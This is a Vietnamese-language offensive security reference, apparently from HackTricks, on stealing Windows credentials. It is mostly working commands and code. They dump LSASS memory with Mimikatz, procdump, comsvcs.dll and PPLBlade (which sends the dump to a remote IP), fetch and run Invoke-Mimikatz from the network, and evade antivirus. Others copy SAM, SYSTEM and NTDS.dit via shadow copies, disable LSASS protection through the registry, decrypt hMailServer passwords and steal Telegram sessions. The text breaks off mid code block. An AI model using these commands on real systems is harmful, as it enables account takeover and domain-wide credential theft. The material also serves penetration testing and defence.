# Đánh cắp thông tin xác thực Windows

{{#include ../../banners/hacktricks-training.md}}

## Thông tin xác thực Mimikatz

```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```

**Tìm hiểu những việc khác mà Mimikatz có thể làm trên** [**trang này**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz

```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```

[**Tìm hiểu một số biện pháp bảo vệ thông tin xác thực có thể áp dụng tại đây.**](credentials-protections.md) **Các biện pháp bảo vệ này có thể ngăn Mimikatz trích xuất một số thông tin xác thực.**

## Credentials with Meterpreter

Sử dụng [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **mà tôi đã tạo để** **tìm kiếm mật khẩu và hash** bên trong máy nạn nhân.

```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```

## Vượt qua AV

### Procdump + Mimikatz

Vì **Procdump của** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**là một công cụ hợp pháp của Microsoft**, Defender không phát hiện công cụ này.\
Bạn có thể dùng công cụ này để **dump tiến trình lsass**, **tải dump xuống** và **trích xuất** **thông tin xác thực cục bộ** từ dump.

Bạn cũng có thể dùng [SharpDump](https://github.com/GhostPack/SharpDump).

```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```

Quá trình này được thực hiện tự động bằng [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Lưu ý**: Một số **AV** có thể **phát hiện** việc sử dụng **procdump.exe để dump lsass.exe** là **độc hại**, vì chúng **phát hiện** chuỗi **"procdump.exe" và "lsass.exe"**. Vì vậy, cách **kín đáo hơn** là truyền **PID** của lsass.exe làm **đối số** cho procdump **thay vì** tên **lsass.exe.**

### Dump lsass bằng **comsvcs.dll**

Một DLL có tên **comsvcs.dll**, nằm trong `C:\Windows\System32`, chịu trách nhiệm **dump bộ nhớ tiến trình** khi xảy ra sự cố. DLL này có **hàm** tên **`MiniDumpW`**, được thiết kế để gọi bằng `rundll32.exe`.\
Hai đối số đầu tiên không quan trọng, nhưng đối số thứ ba được chia thành ba thành phần. ID tiến trình cần dump là thành phần thứ nhất, vị trí file dump là thành phần thứ hai, còn thành phần thứ ba bắt buộc phải là từ **full**. Không có tùy chọn thay thế nào.\
Sau khi phân tích ba thành phần này, DLL sẽ tạo file dump và chuyển bộ nhớ của tiến trình được chỉ định vào file đó.\
Có thể sử dụng **comsvcs.dll** để dump tiến trình lsass, nhờ đó không cần tải lên và thực thi procdump. Phương pháp này được mô tả chi tiết tại [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).<sup>[[9]](#references)</sup>

Lệnh sau được dùng để thực thi:

```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```

**Bạn có thể tự động hóa quy trình này bằng** [**lssasy**](https://github.com/Hackndo/lsassy)**.**

### **Dump lsass bằng Task Manager**

1. Nhấp chuột phải vào Task Bar rồi nhấp vào Task Manager
2. Nhấp vào More details
3. Tìm tiến trình "Local Security Authority Process" trong tab Processes
4. Nhấp chuột phải vào tiến trình "Local Security Authority Process" rồi nhấp vào "Create dump file".

### Dump lsass bằng procdump

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) là một binary có chữ ký của Microsoft, thuộc bộ [sysinternals](https://docs.microsoft.com/en-us/sysinternals/).

Một crash dump toàn hệ thống đã có sẵn, hoặc bản sao được nén trong thư mục người dùng có thể truy cập, có thể lưu giữ dữ liệu thông tin xác thực để phân tích ngoại tuyến. Các tên tệp như `MEMORY.DMP` và `MEMORY.7z` chỉ là đầu mối cần kiểm tra: hãy xác minh nguồn gốc và quyền truy cập, đồng thời không mặc định rằng chúng chứa thông tin xác thực còn sử dụng được hoặc hiện hành.

```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```

## Dumping lsass với PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) là công cụ dump Protected Process, hỗ trợ làm rối memory dump và chuyển tệp đến các workstation từ xa mà không ghi tệp xuống đĩa.

**Chức năng chính**:

1. Bypass cơ chế bảo vệ PPL
2. Làm rối các tệp memory dump để né cơ chế phát hiện dựa trên signature của Defender
3. Upload memory dump bằng phương thức RAW và SMB mà không ghi tệp xuống đĩa (fileless dump)

```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```

## LalsDumper – Dump LSASS dựa trên SSP mà không cần MiniDumpWriteDump

Ink Dragon phát hành một công cụ dump gồm ba giai đoạn có tên **LalsDumper**. Công cụ này không bao giờ gọi `MiniDumpWriteDump`, nên các hook EDR trên API đó sẽ không bị kích hoạt:<sup>[[3]](#references)</sup>

1. **Stage 1 loader (`lals.exe`)** – tìm trong `fdp.dll` một placeholder gồm 32 ký tự `d` viết thường, thay thế nó bằng đường dẫn tuyệt đối đến `rtu.txt`, lưu DLL đã chỉnh sửa thành `nfdp.dll`, rồi gọi `AddSecurityPackageA("nfdp","fdp")`. Thao tác này buộc **LSASS** tải DLL độc hại dưới dạng Security Support Provider (SSP) mới.
2. **Stage 2 bên trong LSASS** – khi LSASS tải `nfdp.dll`, DLL đọc `rtu.txt`, XOR từng byte với `0x20`, rồi ánh xạ blob đã giải mã vào bộ nhớ trước khi chuyển quyền thực thi.
3. **Stage 3 dumper** – payload đã ánh xạ tái triển khai logic MiniDump bằng **direct syscall**, được phân giải từ các tên API đã băm (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`). Một export chuyên dụng tên là `Tom` mở `%TEMP%\<pid>.ddt`, ghi dump LSASS đã nén vào tệp, rồi đóng handle để có thể exfiltration sau đó.

Ghi chú vận hành:

* Đặt `lals.exe`, `fdp.dll`, `nfdp.dll` và `rtu.txt` trong cùng một thư mục. Stage 1 thay placeholder được hard-code bằng đường dẫn tuyệt đối đến `rtu.txt`, nên để chúng ở các thư mục riêng sẽ làm đứt chuỗi.
* Việc đăng ký được thực hiện bằng cách thêm `nfdp` vào `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`. Bạn có thể tự tạo giá trị này để LSASS tải lại SSP mỗi lần khởi động.
* Các tệp `%TEMP%\*.ddt` là dump đã nén. Giải nén cục bộ, sau đó đưa chúng vào Mimikatz/Volatility để trích xuất thông tin xác thực.
* Cần quyền admin/SeTcb để chạy `lals.exe` và giúp `AddSecurityPackageA` thành công; khi lệnh gọi trả về, LSASS sẽ tự động tải SSP giả mạo và thực thi Stage 2.
* Xóa DLL khỏi ổ đĩa không gỡ nó khỏi LSASS. Hãy xóa mục registry rồi khởi động lại LSASS (reboot), hoặc giữ nguyên để duy trì persistence lâu dài.

## CrackMapExec

### Dump hash SAM

```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```

### Dump bí mật LSA

```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```

### Dump NTDS.dit từ DC mục tiêu

```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```

### Dump lịch sử mật khẩu NTDS.dit từ DC mục tiêu

```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```

### Hiển thị thuộc tính pwdLastSet cho mỗi tài khoản trong NTDS.dit

```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```

## Đánh cắp SAM & SYSTEM

Các tệp này thường **nằm** trong _C:\windows\system32\config\SAM_ và _C:\windows\system32\config\SYSTEM._ Nhưng **bạn không thể sao chép chúng theo cách thông thường** vì chúng được bảo vệ.

### Từ Registry

Cách dễ nhất để lấy các tệp này là sao chép chúng từ Registry:

```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```

**Tải xuống** các tệp đó về máy Kali của bạn và **trích xuất các hash** bằng cách:

```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```

### Volume Shadow Copy

Bạn có thể sao chép các tệp được bảo vệ bằng dịch vụ này. Bạn cần có quyền Quản trị viên.

#### Using vssadmin

Tệp nhị phân vssadmin chỉ có trong các phiên bản Windows Server.

```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```

Nhưng bạn cũng có thể làm tương tự từ **Powershell**. Đây là ví dụ về **cách sao chép tệp SAM** (ổ đĩa được sử dụng là "C:" và tệp được lưu vào C:\users\Public), nhưng bạn có thể dùng cách này để sao chép bất kỳ tệp được bảo vệ nào:

```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```

Code trong sách: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)<sup>[[7]](#references)</sup>

### Invoke-NinjaCopy

Cuối cùng, bạn cũng có thể sử dụng [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) để tạo bản sao của SAM, SYSTEM và ntds.dit.

```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```

## **Thông tin xác thực Active Directory - NTDS.dit**

Tệp **NTDS.dit** được xem là trái tim của **Active Directory**, chứa dữ liệu quan trọng về các đối tượng người dùng, nhóm và thành viên của chúng. Đây là nơi lưu trữ **password hash** của người dùng trong domain. Tệp này là cơ sở dữ liệu **Extensible Storage Engine (ESE)** và nằm tại **_%SystemRoom%/NTDS/ntds.dit_**.

Cơ sở dữ liệu này duy trì ba bảng chính:

- **Data Table**: Bảng này lưu trữ thông tin chi tiết về các đối tượng như người dùng và nhóm.
- **Link Table**: Bảng này theo dõi các mối quan hệ, chẳng hạn như thành viên nhóm.
- **SD Table**: Bảng này lưu trữ **security descriptor** cho từng đối tượng, đảm bảo tính bảo mật và kiểm soát quyền truy cập đối với các đối tượng được lưu trữ.

Nghiên cứu ở tầng cơ sở dữ liệu của Christoffer Andersson mô tả chi tiết hơn về các bảng này và cách chúng hoạt động khác nhau tùy phiên bản.<sup>[[8]](#references)</sup>

Windows sử dụng _Ntdsa.dll_ để tương tác với tệp đó, và _lsass.exe_ sử dụng tệp này. Sau đó, **một phần** của tệp **NTDS.dit** có thể nằm **bên trong bộ nhớ `lsass`** (có thể tìm thấy dữ liệu được truy cập gần đây nhất nhờ cải thiện hiệu năng bằng cách sử dụng **cache**).

#### Giải mã các hash bên trong NTDS.dit

Hash được mã hóa ba lần:

1. Giải mã Password Encryption Key (**PEK**) bằng **BOOTKEY** và **RC4**.
2. Giải mã **hash** bằng **PEK** và **RC4**.
3. Giải mã **hash** bằng **DES**.

**PEK** có **cùng giá trị trên mọi domain controller**, nhưng được **mã hóa** bên trong **NTDS.dit** bằng **BOOTKEY** riêng của domain controller đó, lấy từ hive **SYSTEM**. Do đó, để trích xuất thông tin xác thực cần có cả **NTDS.dit** và **SYSTEM** (`C:\Windows\System32\config\SYSTEM`).

### Sao chép NTDS.dit bằng Ntdsutil

Có từ Windows Server 2008.

```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```

Bạn cũng có thể dùng thủ thuật [**volume shadow copy**](#stealing-sam-and-system) để sao chép tệp **ntds.dit**. Hãy nhớ rằng bạn cũng sẽ cần một bản sao của **tệp SYSTEM** (một lần nữa, hãy dùng thủ thuật [**dump tệp đó từ registry hoặc dùng volume shadow copy**](#stealing-sam-and-system)).

### **Trích xuất hash từ NTDS.dit**

Sau khi **lấy được** các tệp **NTDS.dit** và **SYSTEM**, bạn có thể dùng các công cụ như _secretsdump.py_ để **trích xuất hash**:

```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```

Bạn cũng có thể **trích xuất chúng tự động** bằng tài khoản domain admin hợp lệ:

```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```

Đối với **các tệp NTDS.dit lớn**, nên trích xuất chúng bằng [gosecretsdump](https://github.com/c-sto/gosecretsdump).

Cuối cùng, bạn cũng có thể dùng **module metasploit**: _post/windows/gather/credentials/domain_hashdump_ hoặc **mimikatz** `lsadump::lsa /inject`

### **Trích xuất các đối tượng domain từ NTDS.dit vào cơ sở dữ liệu SQLite**

Có thể trích xuất các đối tượng NTDS vào cơ sở dữ liệu SQLite bằng [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Công cụ này không chỉ trích xuất secrets mà còn trích xuất toàn bộ các đối tượng và thuộc tính của chúng để tiếp tục thu thập thông tin, khi tệp NTDS.dit thô đã được lấy.

```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```

Hive `SYSTEM` là tùy chọn nhưng cho phép giải mã secrets (hash NT & LM, thông tin xác thực bổ sung như mật khẩu dạng cleartext, khóa Kerberos hoặc trust, lịch sử mật khẩu NT & LM). Cùng với những thông tin khác, dữ liệu được trích xuất bao gồm: tài khoản người dùng và máy tính cùng với hash của chúng, các cờ UAC, dấu thời gian đăng nhập gần nhất và thay đổi mật khẩu gần nhất, mô tả tài khoản, tên, UPN, SPN, nhóm và tư cách thành viên đệ quy, cây organizational unit và tư cách thành viên, các domain đáng tin cậy cùng với loại, hướng và thuộc tính của trust...

## Lazagne

Tải binary từ [đây](https://github.com/AlessandroZ/LaZagne/releases). Bạn có thể dùng binary này để trích xuất thông tin xác thực từ nhiều phần mềm.

```
lazagne.exe all
```

## Các công cụ khác để trích xuất thông tin xác thực từ SAM và LSASS

### Windows credentials Editor (WCE)

Công cụ này có thể được dùng để trích xuất thông tin xác thực từ bộ nhớ. Tải xuống tại: [http://www.ampliasecurity.com/research/windows-credentials-editor/](http://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Trích xuất thông tin xác thực từ tệp SAM

```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```

### PwDump

Trích xuất thông tin xác thực từ tệp SAM

```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```

### PwDump7

Tải xuống từ:[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) rồi chỉ cần **thực thi** là mật khẩu sẽ được trích xuất.

## Khai thác các phiên RDP không hoạt động và làm suy yếu các biện pháp kiểm soát bảo mật

FinalDraft RAT của Ink Dragon có tasker `DumpRDPHistory` với các kỹ thuật hữu ích cho mọi red-teamer:<sup>[[3]](#references)</sup>

### Thu thập telemetry theo kiểu DumpRDPHistory

* **Các mục tiêu RDP đi** – phân tích mọi user hive tại `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*`. Mỗi subkey lưu tên máy chủ, `UsernameHint` và dấu thời gian ghi gần nhất. Bạn có thể tái tạo logic của FinalDraft bằng PowerShell:

  ```powershell
  Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
      Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
        ForEach-Object {
            $server = Split-Path $_.Name -Leaf
            $user = (Get-ItemProperty $_.Name).UsernameHint
            "OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
        }
  }
  ```

* **Bằng chứng RDP đến** – truy vấn nhật ký `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` để tìm Event ID **21** (đăng nhập thành công) và **25** (ngắt kết nối), nhằm xác định ai đã quản trị máy:

  ```powershell
  Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
    | Where-Object { $_.Id -in 21,25 } \
    | Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
  ```

Khi đã biết Domain Admin nào thường xuyên kết nối, hãy dump LSASS (bằng LalsDumper/Mimikatz) khi phiên **đã ngắt kết nối** của họ vẫn còn tồn tại. CredSSP + NTLM fallback để lại verifier và token của họ trong LSASS; sau đó có thể phát lại chúng qua SMB/WinRM để lấy `NTDS.dit` hoặc thiết lập persistence trên các domain controller.

### Các mục registry bị FinalDraft nhắm đến để hạ cấp

Implant này cũng can thiệp vào một số khóa registry để việc đánh cắp thông tin xác thực trở nên dễ dàng hơn:<sup>[[3]](#references)</sup>

```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```

* `DisableRestrictedAdmin=1` vô hiệu hóa Restricted Admin cho RDP chiều vào; nó **không** bật pass-the-hash thông qua chế độ đó. Đặt giá trị thành `0` cho phép Restricted Admin trên máy đích, nhưng client phải yêu cầu `/RestrictedAdmin` hoặc sử dụng policy bắt buộc Restricted Admin.<sup>[[14]](#references)</sup> Chỉ riêng hash không cấp quyền quản trị từ xa; xem [các điều kiện tiên quyết để xác thực RDP](../../network-services-pentesting/pentesting-rdp.md).<sup>[[15]](#references)</sup>
* `LocalAccountTokenFilterPolicy=1` vô hiệu hóa lọc token UAC để tài khoản local admin nhận được token không bị hạn chế qua mạng.
* `DSRMAdminLogonBehavior=2` cho phép quản trị viên DSRM đăng nhập khi DC đang online, cung cấp cho attacker thêm một tài khoản đặc quyền cao có sẵn.
* `RunAsPPL=0` loại bỏ các biện pháp bảo vệ LSASS PPL, khiến các công cụ dump như LalsDumper dễ dàng truy cập bộ nhớ.

## Thông tin xác thực cấu hình hMailServer (sau khi compromise)

Kiểm tra chính xác các tệp cấu hình `C:\Program Files\hMailServer\Bin\hMailServer.ini`, `C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini` và `C:\ProgramData\hMailServer\hMailServer.ini` tùy theo cách cài đặt. Giá trị `[Security] AdministratorPassword=` có thể đọc được và không rỗng là hash mật khẩu quản trị hMailServer; nó không phải bằng chứng về mật khẩu Windows Administrator. Nếu lấy được thông tin xác thực đó, mọi bước chuyển sang tài khoản Windows đều cần xác minh độc lập việc tái sử dụng mật khẩu và quyền đăng nhập.

Với các cài đặt sử dụng cơ sở dữ liệu SQL CE, giá trị `[Database] Password=` riêng biệt trong INI dùng để bảo vệ cơ sở dữ liệu. Trong các bản cài đặt cũ, giá trị này được mã hóa bằng Blowfish với khóa tĩnh `THIS_KEY_IS_NOT_SECRET` và thao tác hoán đổi endianness theo từ 4 byte. Dùng chuỗi hex trong INI với đoạn mã Python sau:<sup>[[2]](#references)</sup>

Trước tiên, hãy xác nhận tài khoản hiện tại có thể đọc **cả** INI lẫn tệp cơ sở dữ liệu SQL CE `.sdf` tương ứng. Mật khẩu trong INI bảo vệ cơ sở dữ liệu; nó tách biệt với các hash tài khoản mailbox được lưu bên trong. Chỉ kiểm tra hoặc nâng cấp **bản sao** của cơ sở dữ liệu đang được sử dụng, tuyệt đối không thao tác trên tệp đang hoạt động.

```python
from Crypto.Cipher import Blowfish
import binascii

def swap4(data):
    return b"".join(data[i:i+4][::-1] for i in range(0, len(data), 4))
enc_hex = "HEX_FROM_HMAILSERVER_INI"
enc = binascii.unhexlify(enc_hex)
key = b"THIS_KEY_IS_NOT_SECRET"
plain = swap4(Blowfish.new(key, Blowfish.MODE_ECB).decrypt(swap4(enc))).rstrip(b"\x00")
print(plain.decode())
```

Với mật khẩu dạng văn bản thuần, sao chép cơ sở dữ liệu SQL CE để tránh khóa tệp, nạp provider 32-bit và nâng cấp nếu cần trước khi truy vấn các hash:

```powershell
Copy-Item "C:\Program Files (x86)\hMailServer\Database\hMailServer.sdf" C:\Windows\Temp\
Add-Type -Path "C:\Program Files (x86)\Microsoft SQL Server Compact Edition\v4.0\Desktop\System.Data.SqlServerCe.dll"
$engine = New-Object System.Data.SqlServerCe.SqlCeEngine("Data Source=C:\Windows\Temp\hMailServer.sdf;Password=[DBPASS]")
$engine.Upgrade("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf")
$conn = New-Object System.Data.SqlServerCe.SqlCeConnection("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf;Password=[DBPASS]"); $conn.Open()
$cmd = $conn.CreateCommand(); $cmd.CommandText = "SELECT accountaddress,accountpassword FROM hm_accounts"; $cmd.ExecuteReader()
```

Cột `accountpassword` sử dụng định dạng hash của hMailServer (chế độ hashcat `1421`). Mật khẩu mailbox đã crack chỉ trở thành điểm pivot sang người dùng Windows nếu mật khẩu đó được một tài khoản local/domain sử dụng lại và tài khoản đó có quyền đăng nhập từ xa cần thiết.

## Chặn callback đăng nhập LSA (LsaApLogonUserEx2)

Một số công cụ thu thập **mật khẩu đăng nhập dạng plaintext** bằng cách chặn callback đăng nhập LSA `LsaApLogonUserEx2`. Ý tưởng là hook hoặc bọc callback của authentication package để thu thập thông tin xác thực **trong quá trình đăng nhập** (trước khi hashing), sau đó ghi vào đĩa hoặc trả về cho operator. Cách này thường được triển khai dưới dạng helper inject vào LSA hoặc đăng ký với LSA, rồi ghi lại từng sự kiện đăng nhập tương tác/mạng thành công, bao gồm username, domain và password.<sup>[[1]](#references)</sup>

Ghi chú vận hành:
- Cần quyền local admin/SYSTEM để tải helper vào luồng xác thực.
- Thông tin xác thực chỉ được thu thập khi có sự kiện đăng nhập (tương tác, RDP, service hoặc đăng nhập mạng, tùy thuộc vào hook).

## Thông tin xác thực kết nối đã lưu trong SSMS (sqlstudio.bin)

SQL Server Management Studio (SSMS) lưu thông tin kết nối đã lưu trong tệp `sqlstudio.bin` riêng của từng người dùng. Các công cụ dump chuyên dụng có thể phân tích tệp và khôi phục thông tin xác thực SQL đã lưu. Trong các shell chỉ trả về đầu ra lệnh, tệp thường được exfiltrate bằng cách mã hóa thành Base64 rồi in ra stdout.<sup>[[1]](#references)</sup>

```cmd
certutil -encode sqlstudio.bin sqlstudio.b64
type sqlstudio.b64
```

Ở phía operator, hãy build lại file và chạy dumper cục bộ để khôi phục thông tin xác thực:

```bash
base64 -d sqlstudio.b64 > sqlstudio.bin
```

## Đánh cắp phiên trình duyệt và cookie qua Chrome DevTools Protocol

{{#ref}}
../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md#enabling-cdp-inside-a-live-chromium-process
{{#endref}}

## Đánh cắp phiên `tdata` của Telegram Desktop

Telegram Desktop lưu thông tin xác thực và trạng thái tài khoản trong thư mục **`tdata`**. Có thể tải bản sao của phiên bằng các công cụ tương thích để xác thực mà không cần mật khẩu tài khoản, miễn là phiên cấp quyền đó vẫn còn hiệu lực; nếu bật mã hóa dữ liệu cục bộ, kẻ đánh cắp cũng cần có mật mã của người dùng. Phiên đã xác thực có thể làm lộ dữ liệu nhận dạng, siêu dữ liệu về hộp thoại và tư cách thành viên, tin nhắn cũng như nội dung đa phương tiện có thể tải xuống.<sup>[[10]](#references)</sup>

### Tìm kiếm và thu thập

Tìm kiếm cả các bố cục cài đặt thông thường lẫn dạng portable; tên gói Microsoft Store có thể khác nhau, vì vậy hãy liệt kê các thư mục gói chứa `TelegramMessenge` và kiểm tra nhánh con `LocalCache\Roaming` của chúng.<sup>[[10]](#references)</sup>

```powershell
# Standard Telegram Desktop installation
$env:APPDATA + '\Telegram Desktop\tdata'

# Microsoft Store packages
Get-ChildItem "$env:LOCALAPPDATA\Packages" -Directory |
  Where-Object Name -Like '*TelegramMessenge*' |
  ForEach-Object { Get-ChildItem "$($_.FullName)\LocalCache\Roaming" -Recurse -Directory -Filter tdata -ErrorAction SilentlyContinue }

# Portable/nonstandard copies (expensive and noisy)
Get-ChildItem C:\ -Recurse -Directory -Filter tdata -ErrorAction SilentlyContinue
```

Nếu thao tác đọc thông thường thất bại và token của tiến trình **đã chứa và bật** `SeBackupPrivilege`, quyền truy cập nhận biết backup có thể dùng làm phương án dự phòng; cách này không cấp thêm đặc quyền hoặc nâng quyền cho tiến trình. `CreateFileW` với `FILE_FLAG_BACKUP_SEMANTICS` có thể yêu cầu ngữ nghĩa backup/restore và bỏ qua các kiểm tra bảo mật tệp khi token có các đặc quyền cần thiết, nhưng chỉ dùng cờ này không thể vượt qua khóa chia sẻ không tương thích.<sup>[[10]](#references)[[11]](#references)</sup>

Với tệp đang bị khóa, hãy tạo/đọc **Volume Shadow Copy**; với tệp bị chặn bởi ACL, `robocopy /B` sử dụng chế độ backup và bỏ qua ACL của tệp và thư mục.<sup>[[10]](#references)[[12]](#references)</sup>

```cmd
whoami /priv
robocopy "%APPDATA%\Telegram Desktop\tdata" "C:\Temp\tdata" /E /B
```

Một implant chú trọng tiết kiệm băng thông có thể gửi trước danh sách đường dẫn tệp, nhận mã định danh snapshot cùng các đường dẫn đã được C2 lưu trữ, rồi chỉ tải lên những tệp còn thiếu. Vì vậy, các lần truyền nhỏ theo từng phần sau khi liệt kê đệ quy `tdata` vẫn có thể là dấu hiệu đánh cắp phiên thành công.<sup>[[10]](#references)</sup>

### Phát hiện và ngăn chặn

Tương quan việc một tiến trình không phải Telegram truy cập đệ quy vào `tdata` với việc bật `SeBackupPrivilege`, mở tệp bằng backup semantics, hoạt động VSS hoặc tiến trình con `robocopy.exe` sử dụng `/B`. Đồng thời, tìm kiếm việc liệt kê nhanh cả `%APPDATA%` và `%LOCALAPPDATA%\Packages`, sau đó là các kết nối ra ngoài từ cùng tiến trình. Sau khi bị xâm phạm, hãy dùng **Settings → Devices** (hoặc **Privacy & Security → Active Sessions**) để chấm dứt các phiên không nhận ra; chỉ bật xác minh hai bước sẽ không thu hồi quyền đã bị đánh cắp trước đó.<sup>[[10]](#references)[[13]](#references)</sup>

## Đánh cắp thông tin xác thực Passkeys / WebAuthn từ Chrome trên Windows

Nếu có được quyền thực thi mã với tư cách **người dùng nạn nhân** trên máy Windows sử dụng **Chrome + passkeys được đồng bộ qua Google Password Manager**, passkeys trở thành mục tiêu post-exploitation đáng chú ý, ngay cả **khi không có quyền admin/SYSTEM**.<sup>[[4]](#references)</sup>

### Các hiện vật cục bộ đáng chú ý

```text
%LocalAppData%\Google\Chrome\User Data\<Profile>\Sync Data\LevelDB
%LocalAppData%\Google\Chrome\User Data\<Profile>\passkey_enclave_state
```

- **`Sync Data\LevelDB`** lưu các bản ghi **`WebauthnCredentialSpecifics`** được mã hóa bằng protobuf. Một tiến trình cùng người dùng có thể liệt kê **RP ID**, **username**, **credential ID** và dữ liệu khóa riêng đã mã hóa của các passkey được đồng bộ.<sup>[[5]](#references)</sup>
- **`passkey_enclave_state`** lưu trạng thái đăng ký thiết bị cục bộ, chẳng hạn như **`wrapped_identity_private_key`** và secret được bọc dùng để khôi phục thông tin xác thực đã đồng bộ.<sup>[[4]](#references)</sup>

Kiểm tra nhanh:

```powershell
